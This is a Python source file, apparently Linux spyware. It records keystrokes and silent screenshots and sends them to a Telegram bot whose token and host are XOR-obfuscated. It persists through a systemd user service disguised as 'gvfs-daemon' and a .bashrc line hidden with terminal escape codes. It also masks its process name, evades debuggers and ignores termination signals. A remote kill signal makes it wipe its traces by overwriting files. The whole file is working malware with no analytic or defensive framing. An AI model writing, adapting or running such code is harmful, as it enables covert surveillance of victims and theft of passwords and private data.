import os, sys, io, time, random, socket, ssl, gc, signal, subprocess, hashlib, ctypes, platform, getpass
from Xlib import display, X
from PIL import Image
from pynput.keyboard import Listener

sys.dont_write_bytecode = True
_LAST_DIGEST = None
_S = None
_keylog = []

_T_X = bytearray(b"BURAYA_XORLU_TOKEN")      # <-- Bot token (XOR‑encoded)
_C_X = bytearray(b"BURAYA_XORLU_CHAT_ID")    # <-- Chat id (XOR‑encoded)
_H_X = bytearray(b"BURAYA_XORLU_HOST")       # <-- Telegram host (XOR‑encoded)
_CMD_SIG = bytearray(b"KILL_SIG_XORLU")
_UA = b"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0"

def _get_key():
    try:
        raw = ""
        if os.path.exists("/etc/machine-id"):
            with open("/etc/machine-id", "r") as f: raw = f.read().strip()
        else:
            raw = platform.node() + getpass.getuser() + platform.machine()
        return hashlib.sha256(raw.encode()).digest()[:16]
    except: return b"ANKA_APEX_2026_FIX"

def _crypt(d, k=None):
    if k is None: k = _get_key()
    if isinstance(d, str): d = d.encode()
    k_len = len(k)
    return bytearray((d[i] ^ k[i % k_len] ^ ((i * 13) % 255)) for i in range(len(d)))

def _obliterate(path):
    try:
        if os.path.exists(path) and os.path.isfile(path):
            size = os.path.getsize(path)
            os.utime(path, (1420070400, 1420070400))
            with open(path, "ba+", buffering=0) as f:
                for _ in range(2):
                    f.seek(0); f.write(os.urandom(size))
                    f.flush(); os.fsync(f.fileno())
            new_path = os.path.join(os.path.dirname(path), "".join(random.choices("0123456789", k=8)))
            os.rename(path, new_path); os.remove(new_path)
    except: pass

def _clean_memory():
    global _T_X, _C_X, _H_X, _CMD_SIG
    for v in [_T_X, _C_X, _H_X, _CMD_SIG]:
        if isinstance(v, bytearray): v[:] = os.urandom(len(v))
    gc.collect()

def _ensure_persistence():
    try:
        h = os.path.expanduser("~")
        t_f = os.path.join(h, ".local/share/gvfs-metadata/gvfs-helper")
        s_f = os.path.join(h, ".config/systemd/user/gvfs-daemon.service")
        b_rc = os.path.join(h, ".bashrc")
        os.makedirs(os.path.dirname(t_f), exist_ok=True); os.makedirs(os.path.dirname(s_f), exist_ok=True)
        cp = None
        if os.path.isfile(sys.argv[0]):
            with open(sys.argv[0], "rb") as s: cp = s.read()
        elif _S: cp = _S.encode() if isinstance(_S, str) else _S
        if cp and not os.path.exists(t_f):
            with open(t_f, "wb") as d: d.write(cp); os.chmod(t_f, 0o755)
        if not os.path.exists(s_f):
            sc = (f"[Unit]\nDescription=Virtual Filesystem service\n\n"
                  f"[Service]\nExecStart={sys.executable} -B {t_f}\n"
                  f"Restart=always\nEnvironment=DISPLAY=:0\n\n"
                  f"[Install]\nWantedBy=default.target\n")
            with open(s_f, "w") as f: f.write(sc)
            os.utime(s_f, (1672531200, 1672531200))
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "gvfs-daemon.service"], capture_output=True)
            subprocess.run(["systemctl", "--user", "start", "gvfs-daemon.service"], capture_output=True)
        vfs_id = "# VFS-INIT"
        cmd = f'\r# User aliases \x1b[A\r if ! pgrep -f "gvfs-helper" > /dev/null; then (python3 -B {t_f} &> /dev/null &); fi {vfs_id}\n'
        with open(b_rc, "r") as f: content = f.read()
        if vfs_id not in content:
            with open(b_rc, "a") as af: af.write(cmd)
    except: pass

def get_raw_silent():
    try:
        tmp = f"/dev/shm/.sys_{random.randint(100,999)}"
        backends = [
            ["dbus-send", "--session", "--type=method_call", "--dest=org.gnome.Shell.Screenshot",
             "/org/gnome/Shell/Screenshot", "org.gnome.Shell.Screenshot.Screenshot",
             "boolean:false", "boolean:false", f"string:{tmp}"],
            ["gnome-screenshot", "-f", tmp]
        ]
        for cmd in backends:
            try:
                if subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 timeout=5).returncode == 0:
                    if os.path.exists(tmp):
                        with open(tmp, "rb") as f: data = f.read()
                        _obliterate(tmp); return data
            except: continue
        return None
    except: return None

def check_c2():
    try:
        t_v, h_v, sig_raw = _crypt(_T_X), _crypt(_H_X), _crypt(_CMD_SIG)
        h_s = h_v.decode()
        req = bytearray(b"GET /bot"); req.extend(t_v); req.extend(b"/getUpdates?offset=-1 HTTP/1.1\r\nHost: "); req.extend(h_v)
        req.extend(b"\r\nUser-Agent: "); req.extend(_UA); req.extend(b"\r\nConnection: close\r\n\r\n")
        with socket.create_connection((h_s, 443), timeout=10) as s:
            with ssl.create_default_context().wrap_socket(s, server_hostname=h_s) as ss:
                ss.sendall(req); res = bytearray(); ss.settimeout(5.0)
                while True:
                    p = ss.recv(4096)
                    if not p: break
                    res.extend(p)
                    if sig_raw in res: _burn_it_all()
        t_v[:] = os.urandom(len(t_v)); h_v[:] = os.urandom(len(h_v))
        del t_v, h_v, sig_raw, res; gc.collect()
    except: pass

def send_v(data, filename="u.jpg", content_type="image/jpeg"):
    try:
        t_v, c_v, h_v = _crypt(_T_X), _crypt(_C_X), _crypt(_H_X)
        h_s = h_v.decode(); bound = b"----" + os.urandom(8).hex().encode()
        body = bytearray(b"--"); body.extend(bound); body.extend(b"\r\n")
        body.extend(b"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n"); body.extend(c_v); body.extend(b"\r\n--")
        body.extend(bound); body.extend(b"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+filename.encode()+"\"\r\nContent-Type: "+content_type.encode()+b"\r\n\r\n")
        body.extend(data); body.extend(b"\r\n--"); body.extend(bound); body.extend(b"--\r\n")
        req = bytearray(b"POST /bot"); req.extend(t_v); req.extend(b"/sendDocument HTTP/1.1\r\nHost: "); req.extend(h_v)
        req.extend(b"\r\nUser-Agent: "); req.extend(_UA); req.extend(b"\r\nContent-Type: multipart/form-data; boundary="); req.extend(bound)
        req.extend(b"\r\nContent-Length: "); req.extend(str(len(body)).encode()); req.extend(b"\r\n\r\n"); req.extend(body)
        with socket.create_connection((h_s, 443), timeout=15) as s:
            with ssl.create_default_context().wrap_socket(s, server_hostname=h_s) as ss:
                ss.sendall(req); ss.settimeout(2.0); ss.recv(32); ss.shutdown(socket.SHUT_RDWR)
        t_v[:] = os.urandom(len(t_v)); c_v[:] = os.urandom(len(c_v))
        del t_v, c_v, h_v, body, req
    except: pass
    finally: gc.collect()

def _burn_it_all():
    signal.signal(signal.SIGTERM, signal.SIG_DFL)
    _clean_memory()
    h = os.path.expanduser("~")
    t_f = os.path.join(h, ".local/share/gvfs-metadata/gvfs-helper")
    s_f = os.path.join(h, ".config/systemd/user/gvfs-daemon.service")
    b_rc = os.path.join(h, ".bashrc")
    try:
        with open(b_rc, "r") as f: lines = [l for l in f if "# VFS-INIT" not in l]
        with open(b_rc, "w") as f: f.writelines(lines)
    except: pass
    for p in [t_f, s_f]: _obliterate(p)
    if os.path.exists(sys.argv[0]): _obliterate(sys.argv[0])
    subprocess.Popen(["systemctl", "--user", "stop", "gvfs-daemon.service"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os._exit(0)

def _keylog_handler(key):
    try:
        _keylog.append(key.char)
    except AttributeError:
        _keylog.append(str(key))

def start_keylogger():
    with Listener(on_press=_keylog_handler, daemon=True) as l:
        l.join()

def get_keylog():
    global _keylog
    logs = "".join(_keylog)
    _keylog = []
    return logs.encode()

def run_b():
    global _LAST_DIGEST
    try: ctypes.CDLL('libc.so.6').prctl(15, b"gvfsd-http", 0, 0, 0)
    except: pass
    try:
        with open("/proc/self/status", "r") as f:
            if "TracerPid:\t0" not in f.read(): os._exit(0)
    except: pass
    _ensure_persistence()
    signal.signal(signal.SIGINT, signal.SIG_IGN); signal.signal(signal.SIGTERM, signal.SIG_IGN)
    start_keylogger()
    while True:
        try:
            check_c2()
            raw_data = get_raw_silent()
            if raw_data:
                cur_digest = hashlib.sha256(raw_data).digest()
                if cur_digest != _LAST_DIGEST:
                    send_v(raw_data, filename="screenshot.png", content_type="image/png")
                    _LAST_DIGEST = cur_digest
                del raw_data
            logs = get_keylog()
            if logs:
                send_v(logs, filename="keystrokes.txt", content_type="text/plain")
            time.sleep(random.randint(300, 600)); gc.collect()
        except: time.sleep(600)

if __name__ == "__main__":
    run_b()
